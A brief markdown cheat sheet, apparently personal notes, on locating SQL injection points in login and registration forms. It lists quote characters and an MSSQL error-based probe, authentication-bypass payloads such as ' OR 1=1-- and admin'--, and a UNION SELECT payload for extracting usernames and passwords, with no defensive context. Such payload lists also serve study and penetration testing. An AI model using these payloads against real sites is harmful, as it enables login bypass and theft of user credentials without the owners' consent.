# how to identify where to SQL inject ?

- *`[']` `["]` `[\]` `[ AND 1=convert(int, (select @@versioon)) ]` { for Microsoft SQL server } it show an data base error or an unexpected application behavior {login/ registrations}*
- *`[' OR 1=1--]` `[" OR 1=1--]` `[' OR '1'='1]` `[admin'--]` `[admin' #]` `[OR 'a'='a]`  these payloads are often used  in username or passwords fields to log in without credentials authentication bypass*
- *`[union select username, password From user--]` used for data extraction*
